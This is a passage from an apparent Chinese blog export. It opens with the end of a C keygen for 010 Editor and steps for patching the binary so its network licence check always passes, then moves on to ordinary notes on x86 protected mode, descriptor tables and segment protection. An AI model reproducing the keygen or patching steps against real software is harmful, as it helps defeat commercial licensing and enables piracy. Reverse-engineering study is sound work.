 // cmp k[6], retvalue&gt;&gt;16&amp;&amp;0xFF
 // cmp k[7], retvalue&gt;&gt;24&amp;&amp;0xff
 k[4] = dwKey &amp; 0xFF;
 k[5] = dwKey &gt;&gt; 8 &amp; 0xFF;
 k[6] = dwKey &gt;&gt; 16 &amp; 0xFF;
 k[7] = dwKey &gt;&gt; 24 &amp; 0xFF;

 // 根据分析出来的算法穷举出合适的值
 while (true)
 {
  byte k0 = rand() % 0xff;
  byte k6 = k[6];

  byte al = ((k0 ^ k6) ^ 0x18 + 0x3d) ^ 0xa7;

  if (al &gt;= 0xA)
  {
   k[0] = k0;
   k[6] = k6;
   break;
  }
 }

 while (true)
 {
  byte k1 = rand() % 0xff;
  byte k7 = k[7];
  byte k2 = rand() % 0xff;
  byte k5 = k[5];

  DWORD ESI = (0x100 * (k1 ^ k7 &amp; 0xff) + k2 ^ k5 &amp; 0xff) &amp; 0xffff;
  DWORD EAX = (((ESI ^ 0x7892) + 0x4d30) ^ 0x3421) &amp; 0xffff;

  if (EAX % 0XB == 0 &amp;&amp; EAX / 0XB == dwRet)
  {
   k[1] = k1;
   k[7] = k7;
   k[2] = k2;
   k[5] = k5;
   break;
  }
 }
 // 打印key
 printf("%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X", k[0], k[1], k[2], k[3], k[4], k[5], k[6], k[7], k[8], k[9]);

 getchar();
 getchar();

    return 0;
}
</code></pre>
<h4 id="0x06-但是-之后在使用一段时间后-可能还会有网络验证-会提示说key无效的问题"><a href="#0x06-但是-之后在使用一段时间后-可能还会有网络验证-会提示说key无效的问题" class="headerlink" title="0x06 但是, 之后在使用一段时间后, 可能还会有网络验证, 会提示说key无效的问题"></a>0x06 但是, 之后在使用一段时间后, 可能还会有网络验证, 会提示说key无效的问题</h4><img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551331582(1).jpg" class="" title="img">

<p><strong>对于网络校验来说, 有两个方法可以过掉</strong></p>
<ol>
<li>自己搭建服务器, 分析它发送和接收的的数据包</li>
<li>修改文件使网络验证失效</li>
</ol>
<p><strong>在这里我们选用第二种方法, 来绕过它的网络验证</strong><br>在修改exe文件之前, 我们先用010把它的重定位去除掉, 位置: NtHeader &gt; FileHeader &gt; Characteristics &gt; FILE_RELOCS_STRIPPED字段</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551335094(1).png" class="" title="img">

<p>然后我们开始修改汇编代码<br>经过分析我们发现这里有两处验证的函数, 需要分别修改一下</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551344447(1).jpg" class="" title="img">
<p>修改过后保存一下</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551335661(1).jpg" class="" title="img">

<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551335834(1).jpg" class="" title="img">

<p>接下来我们继续修改后面一处验证<br>这个地方尝试了很多次, 发现eax返回1就可以通过这个验证, 像刚才一样我们把这里也修改保存下来</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551336212(1).jpg" class="" title="img">

<h4 id="over"><a href="#over" class="headerlink" title="over"></a>over</h4><p>这样我们就不用担心他的网络验证问题了</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551336622(1).jpg" class="" title="img">
]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>注册机</tag>
        <tag>软件破解</tag>
      </tags>
  </entry>
  <entry>
    <title>进入保护模式</title>
    <url>/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<ol>
<li><p>保护模式是要保护什么</p>
<span id="more"></span>

<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/17acce13de7fa801e5431f34b95e4867.png" class="" title="17acce13de7fa801e5431f34b95e4867">
</li>
<li><p>全局描述符表<strong>GDT</strong>和全局描述符表寄存器<strong>GDTR</strong></p>
<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/157c9ec465396fb8b62c7a2978d4dbc5-166832631434711.png" class="" title="描述符表">
<p>保护模式下: 对内存的访问让然使用段地址和偏移地址, 但是, 在每个段能够访问之前, 必须先进性登记</p>
</li>
</ol>
<ul>
<li>超出范围的访问会产生一个内部异常的中断</li>
<li>和一个段有关的信息需要八个字节(64位)来描述, 称之为段描述符, 而在内存中存放这些描述符的地方就叫做描述符表<ul>
<li>全局描述符表(GDT): 顾名思义是为整个计算机硬件系统服务的, 进入保护模式之前由系统定义</li>
<li>(GDTR): 描述符表寄存器(48位)<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/21d28d9a8682eb20c1fc1f0938ba542a-166832631434713.png" class="" title="GDTR"></li>
</ul>
</li>
</ul>
<ol start="3">
<li>准备创建全局描述符表</li>
</ol>
<ul>
<li>寻址GDT起始地址的方法<ul>
<li>从CS段主引导程序0x7c00+gdt_base获取到GDT的起始地址, 然后除以16分别讲余数和商放入dx和ax中(16位(除数)	<em>(dx高位和ax低位拼接)(被除数)	ax(商)	dx(余数))</em></li>
</ul>
</li>
</ul>
<pre><code>             ;计算GDT所在的逻辑段地址
         mov ax,[cs:gdt_base+0x7c00]        ;低16位
         mov dx,[cs:gdt_base+0x7c00+0x02]   ;高16位
         mov bx,16
         div bx
         mov ds,ax                          ;令DS指向该段以进行操作
         mov bx,dx                          ;段内起始偏移地址    
</code></pre>
<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/029bee4356257f4d8734737427d4815c-166832631434712.png" class="">

<center>gdt_base是相对于主引导程序的偏移偏移处存放的是我们自定义的GDT表地址</center>

<ol start="4">
<li><p>描述符的分类<br>描述符像是一个索引或者标签</p>
<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/64dca01d9aaef20ad3fc23c38cf90fce-166832631434714.png" class="" title="描述符">
<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/e50691a47afce4f90646d6c746fd58b2-166832631434716.png" class="">
<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/b343ae3ebbe2b9f4f2029b61fa263798-166832631434715.png" class="">
</li>
<li><p>存储器的段描述符- 段的类型和基地址</p>
<ol>
<li>每个描述符占八个字节也就是64位<ol>
<li>如果S=1则当前描述符是存储器的段描述符<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/e5f98567154b1d8b3b15d8220e5c52ea-166832631434717.png" class="" title="段描述符格式"></li>
</ol>
</li>
</ol>
</li>
<li><p>存储器的段描述符-段界限及访问控制</p>
<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/fb8dc67c0a729b770d438eab61806921-166832631434718.png" class="" title="描述符的段界限">
</li>
<li><p>安装存储器的段描述符</p>
<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/6a09e183989807ba111d49b25cb34200-166832631434819.png" class="" title="段描述符对齐">
</li>
<li><p>加载全局描述符表寄存器GDTR</p>
<ol>
<li>lgdt指令<img src="/2022/12/11/22-%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/1b2a40a6372b98fe0840ad30357b939b-166832631434820.png" class="" title="lgdt"></li>
</ol>
</li>
</ol>
<pre><code>             ;初始化描述符表寄存器GDTR
         mov word [cs: gdt_size+0x7c00],15  ;描述符表的界限（总字节数减一）

         lgdt [cs: gdt_size+0x7c00] 
</code></pre>
<ol start="9">
<li><p>开启处理器的第21跟地址线A20<br>通过在第21跟地址线加与门来控制输出, 在现在的CPU上已经废弃</p>
</li>
<li><p>通过设置寄存器CR0的PE位进入保护模式</p>
<ol>
<li>将CR0的第一个比特位置1打开保护模式的开关</li>
</ol>
</li>
<li><p>描述符高速缓存器和保护模式下的内存访问</p>
<ol>
<li>将段选择子传送到段选择器后处理器会到描述符表中取出指定的描述符然后将描述符的内容传送到描述符高速缓存器</li>
<li>将段选择子传送到段选择器, 将描述符中的索引号乘以8得到在描述符表中的偏移量(因为TI位是0所以是从GDT中找)加上GDTR中的线性基地址, 得到一个线性地址从GDT表中取出描述符, 然后将描述符的内容传送到描述符高速缓存器中</li>
</ol>
</li>
<li><p>在调试器中观察实模式和保护模式的内存访问</p>
<ol>
<li>在32位的实模式下也是使用高速缓存器保存基地址, 写入的时候会自动用偏移加上基地址去寻址</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>X86描述符表</tag>
      </tags>
  </entry>
  <entry>
    <title>存储器的保护</title>
    <url>/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/</url>
    <content><![CDATA[<h2 id="01-MOV-DS-AX和-MOV-DS-EAX"><a href="#01-MOV-DS-AX和-MOV-DS-EAX" class="headerlink" title="01. MOV DS, AX和 MOV DS, EAX"></a>01. MOV DS, AX和 MOV DS, EAX</h2><p>这两条指令计算GDT的逻辑段地址,使用64位除法指令: eax(商)保存段地址, edx(余数)保存偏移<br><code>div r/m32</code></p>
<span id="more"></span>

<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1b5047235903fba8bbb50f7d347f9a3a.png" class="">
<p><code>mov ds, ax</code>在16位操作尺寸下机器码是<mark>8ED8</mark>, 在32位操作尺寸下应该是<mark>668ED8</mark>, 但是Intel的官方文档对这种指令做了优化: </p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/b8566b6fdd714d9f20e7ccc8d0d9d4fe.png" class="">
<p>但是有些编译器在编译这条指令的时候仍然会加上<mark>66前缀<mark>所以官方文档建议使用<code>mov ds, eax</code>, 不过在NASM编译器下编译的结果不管是<code>mov ds, eax</code>还是<code>mov ds, ax</code>在16还是32操作尺寸下都不会有<mark>前缀66</mark>.<br>编译之后查看<mark>lst</mark>列表文件:<br>使用16位操作尺寸时:</mark></mark></p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/012766565620de75ea1fd36a90d8a8e7.png" class="" title="16位操作尺寸">
<p>使用32位操作尺寸时:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/a756dd044cdd21358ddb4cd809abbf26.png" class="" title="32位操作尺寸">
<p>可以看到NASM编译器将指令译码成了<mark>8ED8</mark>.<br>处理器不允许在任何时候使用索引字段为<mark>0</mark>的选择子去访问<mark>0号</mark>描述符, 任何时候的访问都会引发异常中断</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/dff722b81cbcf64715b115b92270809e.png" class="" title="0描述符">

<ul>
<li>此节程序设置了<mark>GDT</mark>逻辑地址, 安装了描述符, 加载初始化了<mark>GDTR</mark>, 打开<mark>A20</mark>地址线, 清除中断, 设置CR0寄存器的<strong>PE</strong>位进入保护模式, <strong>jmpf</strong>进入保护模式执行.</li>
</ul>
<h2 id="02-修改段寄存器的保护"><a href="#02-修改段寄存器的保护" class="headerlink" title="02. 修改段寄存器的保护"></a>02. 修改段寄存器的保护</h2><h3 id="本节主要内容-介绍保护模式下修改段寄存器时的保护机制"><a href="#本节主要内容-介绍保护模式下修改段寄存器时的保护机制" class="headerlink" title="本节主要内容:介绍保护模式下修改段寄存器时的保护机制"></a>本节主要内容:介绍保护模式下修改段寄存器时的保护机制</h3><p>保护模式下对段寄存器的修改要分为两步:<br>    1. 将一个描述符选择子带入段选择器此时要检查带入值的合法性<br>    2. 用选择子选择一个描述符并传送到段描述符高速缓存器, 此时要检查描述符的完整性和正确性</p>
<p>在上一节进入到保护模式之后, 执行了<mark>jmpf</mark>, 此时给出的段选择子的<mark>TI位</mark>都是0, 表示要选择的描述符都在<mark>GDT</mark>中. 同时也要执行两步检查来确认这一过程的正确</p>
<ol>
<li><p>将一个描述符选择子带入段选择器此时要检查带入值的合法性</p>
<ol>
<li>处理器会检查访问的描述符的边界, 如果超过了边界条件就会产生一个<mark>异常中断13</mark>, 同时寄存器保持原来的值不变. <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/cf7be462210f27a56e9cce8c87d9f08c.png" class=""></li>
</ol>
</li>
<li><p>用选择子选择一个描述符并传送到段描述符高速缓存器, 此时要检查描述符的完整性和正确性</p>
<ol>
<li>确定描述符的类型, 比如描述符<mark>S=1, X=1</mark>, 表示此描述符代表一个代码段, 只能加载到段寄存器CS. 首先表示描述符类型<mark>TYPE</mark>的四个字段必须是有效的(X E W A), 接着按下表检查描述符的类型与段寄存器是否匹配<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/7f3245ca542c143d7664e8a2f4f92e11.png" class="">
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/834979e102d8631b7557cc77b899c79c.png" class=""></li>
</ol>
</li>
<li><p>检查描述符中的<mark>P位</mark>是否为1, 若为0表示虽然描述符已经定义, 但是它对应的段并不存在物理内存中, 此时处理器终止处理并引发<mark>11号中断</mark>. 一般来说需要定义一个中断处理程序接管<mark>11号中断</mark>,  在中断处理的过程中把该描述符所对应的段从外部硬盘等存储器中调入内存, 然后将<mark>P位</mark>置1. 这种类型的中断返回时并不是返回到下一条指令二十返回到引起中断的那条指令, 这次就可以重新加载描述符到段寄存器了. 如果<mark>P位=1</mark>处理器将描述符加载到段描述符对应的描述符高速缓存器中, 同时将<mark>A位</mark>置1.<br>代码段在<mark>R=1</mark>的时候类似于只读存储器ROM可以使用段超越前缀CS来读取其中的内容也可以将它们的描述符选择子加载到<mark>DS ES FS GS</mark>来作为数据段访问, 但是代码段在任何时候都是不可写的.</p>
</li>
<li><p>一旦上述验证全部通过, 处理器就将<mark>段选择子</mark>加载到<mark>段寄存器</mark>的<mark>段选择器</mark>中.</p>
</li>
</ol>
<p>另外还有一些注意事项:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0eb3ec5d63e3e3e6cd184b56a6239824.png" class="">

<h2 id="03-代码段执行时的保护"><a href="#03-代码段执行时的保护" class="headerlink" title="03. 代码段执行时的保护"></a>03. 代码段执行时的保护</h2><p>进入保护模式之后转移指令<code>jmp 0x0010:flush</code>会修改段寄存器CS, 会进行一系列检查工作:</p>
<ul>
<li>首先选择子<mark>0x0010</mark>指定的描述符不能超过描述符表的边界;</li>
<li>其次指定的描述符必须是代码段描述符, 相关的信息必须是完整且合法的;</li>
<li>还要检查偏移量flush是否超出了当前段的界限. 因为是刚进入保护模式, CS的描述符高速缓存器中的内容还是之前的值, 段界限是<mark>0XFFFF</mark>.<br>一旦通过了检查, 就将<mark>选择子0x0010</mark>带入<mark>CS的段选择器</mark>, 并用描述符填充描述符高速缓存器, 接着用偏移量<mark>flush</mark>修改指令指针寄存器<mark>EIP</mark>, 处理器立即转入目标位置处执行.<br>因为这一条指令刷新了段寄存器<mark>CS</mark>, 导致处理器到一个新的代码段执行.<br>这个描述符指定了<mark>D位是1</mark>表示处理器的默认操作尺寸是32位的, 因为这个描述符所指定的段在<mark>jmp</mark>指令之前是在16位操作尺寸下运行的, 之后是在32位操作尺寸下运行的.<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/896a649a211d80d2b5e6992a385fe38c.png" class="">
在保护模式下一旦相应的描述符被加载到CS描述符高速缓存器中, 则处理器取指令和执行指令的时候就不在访问描述符表, 二十直接使用CS描述符高速缓存器的内容, 从中取得线性基地址同指令指针寄存器<mark>EIP</mark>的值相加形成32位线性基地址, 从内存中取得下一条指令.</li>
</ul>
<p>在执行下一条指令之前, 处理器也要检查指令的地址是否有效, 以防止执行超出允许范围之外的指令. </p>
<p>每个段都有其段界限, 位于其描述符中实际使用的段界限其粒度取决于描述符的<mark>G位</mark>, 实际使用的段界限也要满足于<mark>0 &lt; EIP+指令长度-1 &gt;实际使用的段界限</mark>. </p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/77aebdb7c57f5f90aec1ef93d6cd2f83.png" class="">

<h2 id="04-用向上扩展的段作为栈段"><a href="#04-用向上扩展的段作为栈段" class="headerlink" title="04. 用向上扩展的段作为栈段"></a>04. 用向上扩展的段作为栈段</h2><p>选择<mark>01号</mark>描述符</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/faa6ecfdc04064593c2187538b016d53.png" class="">
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/20d38262af60146b85491f4fc9e35560.png" class="">
<p>查看<mark>01号段描述符</mark></p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/9bb7c4ee6942d6799ec345ab5722dbec.png" class="">

<ul>
<li><strong>基地址</strong>: 为0x00000000</li>
<li><strong>S位</strong>: 为1</li>
<li><strong>X位</strong>: 为0, 表示数据段</li>
<li><strong>E位</strong>: 为0, 表示向上扩展</li>
<li><strong>段界限</strong>: 为0xFFFFF</li>
<li><strong>G位</strong>: 为1, 表示段的粒度为4K字节, 段界限是以4K字节为单位<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/72cf5620753aad0a89a78fff765bab5b.png" class=""></li>
</ul>
<p>这个数据段所占用的空间与之前的代码段重叠了, 我们知道代码段是不允许写入的, 但是不允许写入指的是不允许通过代码段的描述符来写入代码段, 是可以通过这个重叠的4G字节的数据段来写入代码段. </p>
<p>设置栈段:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/5f6bc86c2b0bbfa28ae3ced5216d4e23.png" class="">
<p>二进制<mark>11</mark>是第四个描述符</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/9d4184077cda167885a8ad7a748e3cf7.png" class="">

<ul>
<li><strong>X位</strong>: 为0, 表示为数据段</li>
<li><strong>B位(因为是数据段所以D/B位是B位)</strong>: 为1表示使用<mark>ESP</mark>(为0则使用SP)</li>
<li><strong>E位</strong>: 为0, 表示是向上扩展的段</li>
<li><strong>基地址</strong>: 为0x00006C00</li>
<li><strong>段界限</strong>: 为0x007FF</li>
<li><strong>G位</strong>: 为0, 表示段界限的粒度以字节为单位</li>
</ul>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/c07413ae69547ac24bc35c6478c45746.png" class="">

<center>这个栈段是数据段, 共2K字节</center>

<p>栈的<mark>扩展方向</mark>和<mark>推进方向</mark>不同, 段扩展方向不是数据的读写方向, 而是用来定义偏移量的范围, 界限检查.<br>段的扩展方向决定了处理器如何对段的访问进行检查</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/992185c00e3d10260709cc14bfc4af81.png" class="">
<p>因为这是数据段, 所以是B位, 且B位的值为1, 表示使用ESP当作栈的指针, 所以要设置ESP的初始值为段的大小(段界限0x7FF + 1 = 0x800 = 2048). </p>
<h2 id="05-向上扩展的段作为栈段时的保护"><a href="#05-向上扩展的段作为栈段时的保护" class="headerlink" title="05. 向上扩展的段作为栈段时的保护"></a>05. 向上扩展的段作为栈段时的保护</h2><p>上一节中使用的栈段为2K字节:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/38ecf365ff993ff5e8cc0d71e3e3c4b8.png" class="">

<p>且使用<mark>ESP</mark>当作栈指针寄存器来进行隐式的栈操作指令, 如:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/3dbad33e467a13c4c8bb0f56683128b9.png" class="">
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/650aa3cfe536d7e955920ed47a12a600.png" class="">
<p>这些指令操作时, 会对栈进行压栈, 出栈.</p>
<p>使用下列两条代码演示栈的检查:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1b581c0afc4c2bc3e56eb88b6ea86b95.png" class="">

<p>在压入时对偏移量进行检查:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0da722cc7dd0fd58228cd9a0786f8b37.png" class="">
<p>第一条指令压栈后的状态, 和检查过程:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/5233807d22ddc7f010f94b872ed3e281.png" class="">
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/9e8bead96b7411a85c63c58a3f574449.png" class="">
<p>正好符合使用界限的要求, 若将<mark>ESP</mark>的初始值设置为大于0x800比如<mark>0x802</mark>, 再进行压栈指令操作时就会将数据压入到边界之外, 会导致处理器产生中断.</p>
<h2 id="06-访问普通数据段时的保护"><a href="#06-访问普通数据段时的保护" class="headerlink" title="06. 访问普通数据段时的保护"></a>06. 访问普通数据段时的保护</h2><p>将上一节压入的数据弹出:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/c8cd77849769d1fb3edd1e0250dc51e6.png" class="">

<p>当前栈的布局:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/e8328caac6a6420bd869459b6bd1b079.png" class="">
<p>首先需要检查出栈的数据是否超出栈的边界:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0666f08ce296096fab463e028efe3114.png" class="">

<p>检查通过之后:<br>    1. 使用<mark>SS</mark>的基地址<mark>0x00006C00</mark>加上当前<mark>ESP</mark>中的偏移值<mark>0x07F8</mark>得到有效地址<mark>0x00073F8</mark>, 从这个地址处出去四个字节数据.<br>    2. 之后使用默认的数据段<mark>DS</mark>段地址<mark>0x00000000</mark>加上指令中给出的偏移量<mark>0x0B800</mark>得到有效地址为<mark>0x000B8000</mark>, 将栈中弹出的数据写入此处.<br>    <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/1966f897d44a0bafbb6c4950cbe27596.png" class=""><br>    在写入之前, 处理器要检查是否会超出段界限之外:<br>    <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/df76be4458212651a62defd71f6b34c4.png" class=""><br>    写入之后数据段<mark>DS</mark>的状态:<br>    <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/6a19b8a2865e1c148aede31b98375256.png" class=""><br>    3. 出栈之后, 处理器将<mark>ESP的值加4</mark>变为<mark>0x07FC</mark><br>    <img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/36ee499be6eca2ea474c7240d2343bef.png" class=""></p>
<h2 id="07-内存线性地址的回绕特性"><a href="#07-内存线性地址的回绕特性" class="headerlink" title="07. 内存线性地址的回绕特性"></a>07. 内存线性地址的回绕特性</h2><p>段的逻辑地址为<mark>0x00000000</mark>, 加上右边的偏移量, 得到逻辑地址</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/fcb649fcc68631430ba4a99f986defb7.png" class="">
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/0e52729cf791d29491cad920d07b0c53.png" class="">
<p>还可以使用下列方式表示偏移量:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/483ed43e4cf752c5847ddb7949b0e895.png" class="">
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/7b46f7ff6dfa07da667fc96c766bcea2.png" class="">
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/ef863300690948d99350071f8d5464b3.png" class="">

<h2 id="08-用向下扩展的段作为栈段"><a href="#08-用向下扩展的段作为栈段" class="headerlink" title="08. 用向下扩展的段作为栈段"></a>08. 用向下扩展的段作为栈段</h2><p>之前使用向上扩展的段作为栈段, 大小为2K字节.</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/e62ebf4b9bfa8ca5424718326670afec.png" class="">
<p>描述符:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/2951d97f1dd24b7c5e9cf3b6d522fecf.png" class="">

<ul>
<li>S位: 为1, 表示为寄存器的段描述符</li>
<li>X位: 为0, 表示数据段描述符, 为1表示是代码段描述符</li>
<li>E位: 为0, 表示是向上扩展的段, 为1表示是向下扩展的段<br>向下扩展的数据段实际允许使用的偏移量范围 = 实际允许使用的段界限 + 1开始的, 段内偏移量的最大值为<mark>0xFFFF</mark>或<mark>0xFFFFFFFF</mark>.<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/15f11c6a8e4dbf4ebd18d79a9f2aecff.png" class=""></li>
</ul>
<p>对于向下扩展的段:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/7c598377dd29fff913aca0e7d63b922f.png" class="">

<p>程序中使用的第二个栈段:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/dc8055320b99f5258a5a34c8309a7f0d.png" class="">

<p>程序中使用的第二个栈段描述符:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/391097b5520370f4dc8a85612f2a0535.png" class="">
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/ff70bd2dd24a02e094faf74301722bfb.png" class="">

<ul>
<li>S位: 为1, 表示存储器的段描述符</li>
<li>X位: 为0, 表示数据段</li>
<li>段基地址: <mark>0x00007C00</mark></li>
<li>E位: 为1, 表示向下扩展</li>
<li>W位: 为1, 表示可读可写</li>
<li>段界限: <mark>0xFFFFFE</mark></li>
<li>G位: 为1, 表示粒度以<mark>4K字节</mark>为单位</li>
<li>B位: 为1, 表示偏移量理论最大值是<mark>0xFFFFFFFF</mark>, 而且使用<mark>ESP</mark>位栈指针</li>
</ul>
<p>这个栈段的状态如下图:</p>
<img src="/2022/12/11/24-%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E4%BF%9D%E6%8A%A4/440c379626a7dfa235d192c8f824473c.png" class="">
<p><mark>ESP</mark>的值要设置为栈的最大界限值 + 1: <mark>0xFFFFFFFF +1 = 0x00000000</mark>.</p>
<h2 id="09-向下扩展的段作为栈段时的保护"><a href="#09-向下扩展的段作为栈段时的保护" class="headerlink" title="09. 向下扩展的段作为栈段时的保护"></a>09. 向下扩展的段作为栈段时的保护</h2><p>上一节中设置的栈:</p>
